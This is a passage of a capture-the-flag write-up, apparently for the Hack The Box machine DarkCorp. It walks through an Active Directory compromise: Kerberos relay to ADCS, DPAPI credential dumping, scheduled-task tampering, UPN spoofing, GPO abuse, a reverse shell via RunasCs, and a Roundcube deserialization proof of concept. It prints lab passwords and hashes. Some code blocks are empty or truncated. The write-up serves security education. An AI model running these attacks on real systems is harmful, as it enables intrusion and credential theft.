#### Network

I’ll run a ping sweep of the current network and find three total hosts:

```
postgres@drip:/var/lib/postgresql$ for i in {1..254}; do (ping -c 1 172.16.20.${i} | grep "bytes from" | grep -v "Unreachable" &); done;
64 bytes from 172.16.20.1: icmp_seq=1 ttl=128 time=4.13 ms
64 bytes from 172.16.20.2: icmp_seq=1 ttl=128 time=4.35 ms
64 bytes from 172.16.20.3: icmp_seq=1 ttl=64 time=0.032 ms
```

.3 is this VM, and.1 is almost assuredly the main host. The `/etc/hosts` file confirms that 1. is the DC:

```
127.0.0.1       localhost drip.htb mail.drip.htb dev-a3f1-01.drip.htb

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

172.16.20.1 DC-01 DC-01.darkcorp.htb darkcorp.htb
172.16.20.3 drip.darkcorp.htb
```

I’ll use SSH with ebelford to make a socks proxy:

```bash
sshpass -p 'ThePlague61780' ssh ebelford@drip.htb -D 1080
```

#### 172.16.20.1

I’ll grab a [static nmap](https://github.com/andrew-d/static-binaries/raw/refs/heads/master/binaries/linux/x86_64/nmap) binary and upload it to the container. I’ll scan the hosts..1 looks like a DC:

```

```

It also has SSH (22) and HTTP (80), as well as WinRM (5985).

`netexec` show that this is a host named DC-01 on darkcorp.htb:

```

#### 172.16.20.2

.2 looks like Windows as well, but this time at least one (80) if not two (5000) HTTP ports:

```

The hostname is WEB-01:

```

Using the tunnel and FoxyProxy, I’ll visit the sites. 80 is just IIS default:

![image-20251014112740840](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20251014112740840.webp)

5000 pops HTTP auth:

![image-20251014112719893](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20251014112719893.webp)

I’m not able to get past this yet.

### Recover Backup

To get access to the backup, I’ll need the GPG environment and the passphrase. I can try the password used by the Flask app to connect to the database. For this to work, I’ll need to make sure to set the `TERM` environment variable. There’s a popup asking for the password, and on entering “2Qa2SsBkQvsc”, it dumps the file:

```
postgres@drip:/var/backups/postgres$ export TERM=xterm  
postgres@drip:/var/backups/postgres$ gpg --batch -d dev-dripmail.old.sql.gpg
gpg: encrypted with 3072-bit RSA key, ID 1112336661D8BC1F, created 2025-01-08

2   victor.r    cac1c7b0e7008d67b6db40c03e76b9c0    victor.r@drip.htb
3   ebelford    8bbd7f88841b4223ae63c8848969be86    ebelford@drip.htb
```

ebelford matches the password I found in the log. victor.r cracks as well:

### Validation

The password for ebelford doesn’t work on the domain, but the one for victor.r does:

victor.r’s creds also work on port 5000 on WEB-01 with the HTTP auth.

### Enumeration

#### General Domain Enumeration

With creds on the domain there are some other common things to check. The number of machines a generic user can add to the domain (MachineAccountQuota) is 0, and there is ADCS running on the DC:

#### BloodHound

I’ll use [RustHound-CE](https://github.com/g0h4n/RustHound-CE) to collect BloodHound data:

```

I’ll upload the data into [BloodHound-CE Docker](https://bloodhound.specterops.io/get-started/quickstart/community-edition-quickstart) and start with victor.r:

![image-20251014153836215](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20251014153836215.webp)

Nothing that all domain users can’t do.

#### WEB-01 TCP 5000

I’ll use victor.r’s creds to get into the website, and it’s a basic monitoring dashboard:

![image-20251014144712893](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20251014144712893.webp)

The “Check Status” link (`/check`) shows a form:

![image-20251014144745123](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20251014144745123.webp)

Each of the options is from a drop down:

![image-20251014144808258](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20251014144808258.webp)

### Catch NTLM

Messing with the HTTP request seems like an option, but also works to grab a [statically compiled `socat`](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat) and listen on port 8080, tunneling it to my host:

```
postgres@drip:/dev/shm$ ./socat TCP-LISTEN:8080,bind=0.0.0.0,fork TCP:10.10.14.8:80
```

Now I submit a check request to `drip.darkcorp.htb:8080`:

![image-20251014150423171](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20251014150423171.webp)

Sending that arrives at my listening `nc`:

```
oxdf@hacky$ nc -lnvp 80
Listening on 0.0.0.0 80
Connection received on 10.10.11.54 60524
GET / HTTP/1.1
Host: drip.darkcorp.htb:8080
User-Agent: python-requests/2.32.3
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
```

If I want to try to coerce NTLM auth, I’ll use [Responder](https://github.com/lgandx/Responder), and on sending, I get a connection:

```
oxdf@hacky$ sudo ./venv/bin/python Responder.py -I tun0

```

This Net-NTLMv2 won’t crack.

It’s worth noting that this seems broken in the most recent versions of Responder as of October 2025. It seems to have broken in [this commit](https://github.com/lgandx/Responder/commit/66ee7f8f08f57926f5b3694ffb9e87619eee576f), though I’m not exactly sure why. I was able to get this working by checking out a branch before that one.

svc\_acc doesn’t have any outbound control, but they are a member of the DNSADMINS group:

![image-20251014180648738](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20251014180648738.webp)

That suggests they can edit DNS records, where typical users cannot.

### Get Silver Ticket

#### Strategy

I’m going to put together several pieces here:

- I’ll relay the authentication from the drip webserver to authenticate as svc\_acc to add a DNS record for the DC-01 host that will point to my host (abusing the same trick as [VulnCicada](about:/2025/07/03/htb-vulncicada.html#attack)).
- I’ll then coerce WEB-01 to authenticate to DC-01 and relay that to DC-01 ADCS to get a certificate for Administrator on WEB-01 (a Silver Ticket).

#### Create DNS Record

Just like in VulnCicada, I’ll use the method described in [this Synactiv post](https://www.synacktiv.com/en/publications/relaying-kerberos-over-smb-using-krbrelayx) to relay Kerberos. For that to work, I need to add a DNS record that looks like the hostname plus an empty `CREDENTIAL_TARGET_INFORMATION` structure. This structure allows me to add a record that will resolve to dc-01 without having permissions to modify that entry. So in this case, DC-01 becomes:

```
dc-011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA
```

I can try to just create this record, but victor.r doesn’t have sufficient privileges:

```
oxdf@hacky$ proxychains bloodyAD -u victor.r -p 'victor1gustavo@#' -d darkcorp.htb --host DC-01 add dnsRecord dc-011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA 10.10.14.8

```

Instead, I’ll use [ntlmrelayx](https://github.com/fortra/impacket/tree/master/impacket/examples/ntlmrelayx) (from [Impacket](https://github.com/SecureAuthCorp/impacket)) to relay the auth from acc\_svc (as a member of DNSADMINS) to create this record:

#### Get Ticket

I’ll use [krbrelayx](https://github.com/dirkjanm/krbrelayx) to relay the Kerberos auth from WEB-01 to DC-01:

```
oxdf@hacky$ proxychains krbrelayx.py -t 'https://dc-01.darkcorp.htb/certsrv/certfnsh.asp' --adcs -v 'WEB-01$'

I’m giving it the ADCS HTTP web enrollment endpoint (see my [VulnCicada post](about:/2025/07/03/htb-vulncicada.html#background) for more info). Now I’ll coerce that auth using printer bug (from [krbrelayx](https://github.com/dirkjanm/krbrelayx)):

```

#### Auth

[Certipy](https://github.com/ly4k/Certipy) can auth with the resulting ticket to authenticate to WEB-01:

```

```

I’ll use the NTLM hash to get a ticket, but for that I need the domain SID. `lookupsid.py` will give that (and all the users):

```
oxdf@hacky$ proxychains lookupsid.py -hashes :8f33c7fc7ff515c1f358e488fbb8b675 'darkcorp.htb/WEB-01$@DC-01.darkcorp.htb'

#### Dump Local Hashes

Armed with a Kerberos ticket as the machine account, I’ll dump the local hashes to get more access to WEB-01:

#### Shell

I’ll use that hash to get a shell on WEB-01:

### Enumeration

#### Home Directories

There are no other user home directories on this host:

```
evil-winrm-py PS C:\Users> ls

    Directory: C:\Users

Mode                 LastWriteTime         Length Name

d-r---         1/15/2025   4:11 PM                Public
```

Besides `user.txt`, there’s an interesting `.exe` file and a `cleanup.ps1` script in the Administrator’s directory:

```
evil-winrm-py PS C:\Users\Administrator> tree /f .
Folder PATH listing
Volume serial number is 00000201 E2B2:45D5
C:\USERS\ADMINISTRATOR
¦   HTB-Stability.exe

+---Downloads
+---Favorites
+---Links
+---Music
+---Pictures
+---Saved Games
+---Searches
+---Videos
```

All the PowerShell does it restart the `w3svc` service if it isn’t running:

```powershell
$service = Get-Service -Name "w3svc"
if ($service.Status -ne "Running") {
        Restart-Service -Name "w3svc"
}
```

The binary says it’s not a part of the path:

```
evil-winrm-py PS C:\Users\Administrator> .\HTB-Stability.exe
ATTN: This is not part of the path and only serves as a stability purpose
```

Reversing this binary could be an interesting exercise, but I didn’t have time to do it as a Beyond Root section.

#### Scheduled Tasks

The existence of this script suggest that it runs as a scheduled task. I’ll get Claude to make me a PowerShell line to dump scheduled tasks, and find that both the script and the executable are running with tasks:

```
evil-winrm-py PS C:\> Get-ScheduledTask | Where-Object {$_.State -ne "Disabled"} | Select-Object TaskName, @{Name="User";Expression={$_.Principal.UserId}}, @{Name="Command";Expr

The top line shows the PowerShell script running as administrator. The second line is running the `HTB-Stability.exe` binary.

The “CleanupScript” task is set to run every two minutes according to it’s description:

```

Digging a bit deeper to confirm this:

```
evil-winrm-py PS C:\> $task = Get-ScheduledTask -TaskName "CleanupScript"

CimSystemProperties   : Microsoft.Management.Infrastructure.CimSystemProperties
```

The `Interval` of `PT2M` says it will run every two minutes.

Because there is a scheduled task running as the local Administrator user, that accounts creds must be saved along with it. If this were a domain account I was interested in, as local admin, I could run scheduled tasks as this user, but that doesn’t get me much here.

#### DPAPI Keys

The `CredentialManager` module provides access to saved credentials in the Windows Credential Vault using DPAPI. The `Get-StoredCredential` commandlet will return credential objects, but it doesn’t work with the session I have here:

```
evil-winrm-py PS C:\> Get-StoredCredential
CredEnumerate failed with the error code 1312.
```

There are no credentials stored in the Administrator’s home directory, but there is a DPAPI key:

```
evil-winrm-py PS C:\Users\Administrator\AppData\Roaming\Microsoft> ls -force Credentials
evil-winrm-py PS C:\Users\Administrator\AppData\Roaming\Microsoft> ls -force Protect

    Directory: C:\Users\Administrator\AppData\Roaming\Microsoft\Protect

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----

```

`CREDHIST` stores the users old passwords. The SID is the directory with the keys. There are three:

```
evil-winrm-py PS C:\Users\Administrator\AppData\Roaming\Microsoft\Protect\S-1-5-21-2988385993-1727309239-2541228647-500> ls -force

### Recover Admin Passwords

#### Via DonPAPI / netexec

[DonPAPI](https://github.com/login-securite/DonPAPI) is a really nice tool for exfiling credentials from a compromised host. I’ll install it using `uv tool install donpapi` (see my [uv cheatsheet](about:/cheatsheets/uv#)), and then run it with the Administrator ticket and proxychains:

```
oxdf@hacky$ KRB5CCNAME=Administrator.ccache proxychains -q DonPAPI collect -k --no-pass -t WEB-01.darkcorp.htb

```

It dumps the password for Administrator, “But\_Lying\_Aid9!” from the scheduled task.

I can do the same thing with `netexec`:

```
oxdf@hacky$ KRB5CCNAME=Administrator.ccache proxychains -q netexec smb 172.16.20.2 -u administrator --use-kcache --dpapi
SMB         172.16.20.2     445    WEB-01           [*] Windows Server 2022 Build 20348 x64 (name:WEB-01) (domain:darkcorp.htb) (signing:False) (SMBv1:False)

```

This is the local admin password:

```
oxdf@hacky$ proxychains -q netexec smb 172.16.20.2 -u administrator -p But_Lying_Aid9! --local-auth
SMB         172.16.20.2     445    WEB-01           [*] Windows Server 2022 Build 20348 x64 (name:WEB-01) (domain:darkcorp.htb) (signing:False) (SMBv1:False)
SMB         172.16.20.2     445    WEB-01           [+] WEB-01\administrator:But_Lying_Aid9! (Pwn3d!)
```

I’ll use [RunasCs.exe](https://github.com/antonioCoco/RunasCs) to get a shell with full context:

```
evil-winrm-py PS C:\programdata> .\RunasCs.exe administrator 'But_Lying_Aid9!' cmd.exe -r 10.10.14.8:443

[+] Running in session 0 with process function CreateProcessWithTokenW()
[+] Using Station\Desktop: Service-0x0-4cccc1$\Default
[+] Async process 'C:\Windows\system32\cmd.exe' with pid 96 created in background.
```

At `nc`:

```
oxdf@hacky$ rlwrap -cAr nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.54 51862
Microsoft Windows [Version 10.0.20348.2113]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

I’ll switch to PowerShell and get the credential:

```
C:\Windows\system32>powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Windows\system32> $cred = Get-StoredCredential
PS C:\Windows\system32> $cred.GetNetworkCredential().Username
Administrator
PS C:\Windows\system32> $cred.GetNetworkCredential().Password
Pack_Beneath_Solid9!
```

This is clearly not the current password for Administrator. It must be an older one.

I can also just use `netexec` again authenticating with the password and it now gets the second password:

```
oxdf@hacky$ proxychains -q netexec smb 172.16.20.2 -u administrator -p 'But_Lying_Aid9!' --local-auth --dpapi
SMB         172.16.20.2     445    WEB-01           [*] Windows Server 2022 Build 20348 x64 (name:WEB-01) (domain:WEB-01) (signing:False) (SMBv1:False)

SMB         172.16.20.2     445    WEB-01           [Administrator][CREDENTIAL] LegacyGeneric:target=WEB-01 - Administrator:Pack_Beneath_Solid9!
SMB         172.16.20.2     445    WEB-01           [SYSTEM][CREDENTIAL] Domain:batch=TaskScheduler:Task:{7D87899F-85ED-49EC-B9C3-8249D246D1D6} - WEB-01\Administrator:But_Lying_Aid9!
```

#### Via Scheduled Task

The intended way to fetch the credential is by modifying a scheduled task. When the scheduled task runs as the admin user, it will be in a complete context that allows for access to the stored credentials. I’ll add to the `cleanup.ps1` script:

```
evil-winrm-py PS C:\> echo '' >> C:\Users\Administrator\Documents\cleanup\cleanup.ps1
evil-winrm-py PS C:\> echo '$cred = Get-StoredCredential' >> C:\Users\Administrator\Documents\cleanup\cleanup.ps1
evil-winrm-py PS C:\> echo '$ncred = $cred.GetNetworkCredential()' >> C:\Users\Administrator\Documents\cleanup\cleanup.ps1
evil-winrm-py PS C:\> echo '$user = $ncred.Username' >> C:\Users\Administrator\Documents\cleanup\cleanup.ps1
evil-winrm-py PS C:\> echo '$pass = $ncred.Password' >> C:\Users\Administrator\Documents\cleanup\cleanup.ps1
evil-winrm-py PS C:\> echo 'echo "$user : $pass" > C:\programdata\0xdf.txt' >> C:\Users\Administrator\Documents\cleanup\cleanup.ps1
```

This will run in a full context that will allows access to the credentials, and save them to a file. I could wait for it to run, or just run it:

```
evil-winrm-py PS C:\Users\Administrator\Documents\cleanup> Start-ScheduledTask -TaskName CleanupScript
evil-winrm-py PS C:\Users\Administrator\Documents\cleanup> cat \programdata\0xdf.txt
Administrator : Pack_Beneath_Solid9!
```

### Password Spray

I’ll use `netexec` to dump a list of users:

```
oxdf@hacky$ proxychains -q netexec smb 172.16.20.1 -u victor.r -p victor1gustavo@# --users

```

john.w is a match! I could also spray with the local admin password, but this is what I need to continue forward.

## Auth as angela.w@darkcorp.htb

### Enumeration

John.W has `GenericWrite` over Angela.W:

![image-20251015091349433](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20251015091349433.webp)

### Shadow Credential

I’ll use the `GenericWrite` to set a shadow credential using [Certipy](https://github.com/ly4k/Certipy):

```
oxdf@hacky$ proxychains -q certipy shadow auto -username john.w -p Pack_Beneath_Solid9! -account angela.w -target dc-01.darkcorp.htb
Certipy v5.0.3 - by Oliver Lyak (ly4k)

```

That dumps the NTLM hash, which I can auth with:

```
oxdf@hacky$ proxychains -q netexec smb 172.16.20.1 -u angela.w -H 957246c8137069bca672dc6aa0af7c7a
SMB         172.16.20.1     445    DC-01            [*] Windows Server 2022 Build 20348 x64 (name:DC-01) (domain:darkcorp.htb) (signing:True) (SMBv1:False) (Null Auth:True)
SMB         172.16.20.1     445    DC-01            [+] darkcorp.htb\angela.w:957246c8137069bca672dc6aa0af7c7a
```

## Shell as angela.w.adm@drip

### Enumeration

BloodHound data shows nothing of interest from angela.w. But there is also an angela.w.adm account, and it’s a member of the Linux Admins group:

![image-20251015093953435](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20251015093953435.webp)

### UPN Spoofing

There’s a 2023 post from Pen Test Partners, [A broken marriage. Abusing mixed vendor Kerberos stacks](https://www.pentestpartners.com/security-blog/a-broken-marriage-abusing-mixed-vendor-kerberos-stacks/). This post talks about mismatches in how Windows and other OSes handle Kerberos, and how to abuse those edge cases. The attack here is to update angela.w’s UPN to angela.w.adm, and then generate a TGT. User Principal Name (UPN) is an Active Directory attribute that provides an alternative login name, typically formatted like an email address (e.g., angela.w@darkcorp.htb). It’s supposed to be just another way to reference the same account. The issue here is that by setting the UPN and generating the ticket in a specific way, the TGT will be trusted by Linux as angela.w.adm (rather than angela.w).

The angela.w account doesn’t have a UPN set:

```
oxdf@hacky$ proxychains -q bloodyAD --domain darkcorp.htb --host dc-01 -u john.w -p 'Pack_Beneath_Solid9!' get object angela.w | grep userPrincipalName
```

I’ll set it:

```
oxdf@hacky$ proxychains -q bloodyAD --domain darkcorp.htb --host dc-01 -u john.w -p 'Pack_Beneath_Solid9!' set object angela.w userPrincipalNa
me -v angela.w.adm                    
[+] angela.w's userPrincipalName has been updated
oxdf@hacky$ proxychains -q bloodyAD --domain darkcorp.htb --host dc-01 -u john.w -p 'Pack_Beneath_Solid9!' get object angela.w | grep userPrincipalName
userPrincipalName: angela.w.adm
```

Now I’ll make a ticket:

```
oxdf@hacky$ proxychains getTGT.py -hashes :957246c8137069bca672dc6aa0af7c7a -principalType 'NT_ENTERPRISE' darkcorp.htb/angela.w.adm

[*] Saving ticket in angela.w.adm.ccache
```

It’s important to use the NT\_ENTERPRISE `principalType` for this attack so that the UPN will be used first, as shown in this diagram from the article:

![image-20251015095322441](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20251015095322441.webp)

I’ll upload the resulting ticket to the Linux host using `scp`:

```
oxdf@hacky$ sshpass -p ThePlague61780 scp angela.w.adm.ccache ebelford@drip.htb:/dev/shm/
```

Now I’ll SSH into drip and use `ksu` to authenticate with that key:

```
ebelford@drip:~$ cd /dev/shm/
ebelford@drip:/dev/shm$ KRB5CCNAME=angela.w.adm.ccache ksu angela.w.adm
Authenticated angela.w.adm@DARKCORP.HTB
Account angela.w.adm: authorization for angela.w.adm@DARKCORP.HTB successful
Changing uid to angela.w.adm (1730401107)
angela.w.adm@drip:/dev/shm$
```

There is a cleanup script removing the UPN from the angela.w account.

```
ebelford@drip:/dev/shm$ KRB5CCNAME=angela.w.adm.ccache ksu angela.w.adm
ksu: TGT has been revoked while verifying ticket for server
Authentication failed.
```

This error means it’s necessary to go back and re-add the UPN.

## Shell as root@drip

angela.w.adm can run any command as any user with `sudo`:

```
angela.w.adm@drip:/dev/shm$ sudo -l
Matching Defaults entries for angela.w.adm on drip:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User angela.w.adm may run the following commands on drip:
    (ALL : ALL) NOPASSWD: ALL
```

`sudo -i` returns a root shell:

```
angela.w.adm@drip:/dev/shm$ sudo -i
root@drip:~#
```

## Shell as taylor.b.adm@DC-01

### Enumeration

The Linux host is using SSSD for domain authentication. As root, I can get the configuration now from `/etc/sssd/sssd.conf`:

```
[sssd]
services = nss, pam
domains = darkcorp.htb

[domain/darkcorp.htb]
id_provider = ad
cache_credentials = True
auth_provider = ad
access_provider = simple
default_shell = /bin/bash
use_fully_qualified_names= False
krb5_store_password_if_offline = True
simple_allow_groups = linux_admins
```

`cached_credentials` is enabled! They are stored in `/var/lib/sss/db`:

```
root@drip:/var/lib/sss/db# ls
cache_darkcorp.htb.ldb  ccache_DARKCORP.HTB  config.ldb  sssd.ldb  timestamps_darkcorp.htb.ldb
```

### Cached Password

#### Extract from Database

I’ll exfil the `cache_darkcorp.htb.ldb` file to my host, where I can interact with it using `ldbsearch` (`sudo apt install ldb-tools`). To get cached passwords, I’ll need to add that to the query:

```
oxdf@hacky$ ldbsearch -H cache_darkcorp.htb.ldb '(cachedPassword=*)'
asq: Unable to register control with rootdse!

```

The `cachedPassword` field has a SHA-512 crypt password hash. I could also just find this hash with `strings` and `grep` on the host:

```
root@drip:/var/lib/sss/db# cat cache_darkcorp.htb.ldb | strings -n 60 | grep '\$'
$6$5wwc6mW6nrcRD4Uu$9rigmpKLyqH/.hQ520PzqN2/6u6PZpQQ93ESam/OHvlnQKQppk6DrNjL6ruzY7WJkA2FjPgULqxlb73xNw7n5.

```

#### Crack

I’ll save the hash to a file and pass it to hashcat:

```
$ hashcat taylor.b.adm.hash /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
hashcat (v6.2.6) starting in autodetect mode

...[snip]...
```

#### Verify

I’ll verify that password. On drip, I can `su` from an unprivileged user:

```
angela.w.adm@drip:/dev/shm$ exit
exit
ebelford@drip:/dev/shm$ su - taylor.b.adm
Password: 
su: warning: cannot change directory to /home/darkcorp.htb/taylor.b.adm: No such file or directory
taylor.b.adm@drip:/dev/shm$
```

It also works on the domain:

```
oxdf@hacky$ proxychains -q netexec smb 172.16.20.1 -u taylor.b.adm -p '!QAZzaq1'
SMB         172.16.20.1     445    DC-01            [*] Windows Server 2022 Build 20348 x64 (name:DC-01) (domain:darkcorp.htb) (signing:True) (SMBv1:False) (Null Auth:True)

```

WinRM is available as well:

```
oxdf@hacky$ proxychains -q netexec winrm 172.16.20.1 -u taylor.b.adm -p '!QAZzaq1'
WINRM       172.16.20.1     5985   DC-01            [*] Windows Server 2022 Build 20348 (name:DC-01) (domain:darkcorp.htb)

```

### Shell

I’ll get a shell with `evil-winrm-py`:

```

This provides significant control over the SecurityUpdates group policy object (GPO):

### GPO Abuse

I’ll try [SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse) (just like in [Office](about:/2024/06/22/htb-office.html#gpo-abuse)), but it gets blocked by AMSI:

```
evil-winrm-py PS C:\programdata> .\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount taylor.b.adm --GPOName "SECURITYUPDATES"
Program 'SharpGPOAbuse.exe' failed to run: Operation did not complete successfully because the file contains a virus or potentially unwanted softwareAt line:1 char:1
+ .\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount taylor.b.adm --GPON ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~.
```

[pyGPOAbuse](https://github.com/Hackndo/pyGPOAbuse) will modify GPOs remotely, so I don’t have to worry about AMSI. I showed this previously in [BabyTwo](about:/2025/09/26/htb-babytwo.html#exploit-gpo), and I’ll run basically the same command here:

```
oxdf@hacky$ proxychains uv run --script pygpoabuse.py 'darkcorp.htb/taylor.b.adm:!QAZzaq1' -gpo-id 652CAE9A-4BB7-49F2-9E52-3361F33CE786 -command 'net localgroup administrators taylor.b.adm /add' -f

```

After a couple minutes (running `gpupdate /force` will speed this up), taylor.b.adm shows as `(Pwn3d!)` in `netexec`:

```
oxdf@hacky$ proxychains -q netexec smb dc-01 -u taylor.b.adm -p '!QAZzaq1'
SMB         224.0.0.1       445    DC-01            [*] Windows Server 2022 Build 20348 x64 (name:DC-01) (domain:darkcorp.htb) (signing:True) (SMBv1:False) (Null Auth:True)

```

I’ll use this account to dump hashes:

```

This is not at all necessary, but a nice way to get access as the administrator account using WinRM:

```
oxdf@hacky$ proxychains -q evil-winrm-py -i dc-01 -u administrator -H fcb3ca5a19a1ccf2d14c13e8b64cde0f

[*] Connecting to 'dc-01:5985' as 'administrator'

And grab the root flag:

## Beyond Root

Since the release of DarkCorp, a new vulnerability / exploit, [CVE-2025-49113](https://nvd.nist.gov/vuln/detail/CVE-2025-49113), dropped. This vulnerability in RoundCube is described as:

> Roundcube Webmail before 1.5.10 and 1.6.x before 1.6.11 allows remote code execution by authenticated users because the \_from parameter in a URL is not validated in program/actions/settings/upload.php, leading to PHP Object Deserialization.

[This repo](https://github.com/fearsoff-org/CVE-2025-49113) has a nice POC that will generate the serialized object and upload it to run a command. I’ll tell it to ping my host:

```
oxdf@hacky$ php CVE-2025-49113.php http://mail.drip.htb 0xdf 0xdf 'ping -c 1 10.10.14.8'

There is an incoming ICMP packet:

```
oxdf@hacky$ sudo tcpdump -ni tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes

```

I can change that to a [bash reverse shell](https://www.youtube.com/watch?v=OjkVep2EIlw):

It works:

```
oxdf@hacky$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.54 49856

```

This doesn’t buy me a ton. As the www-data user, I can work my way to the postgres user, joining the same path as above from there.
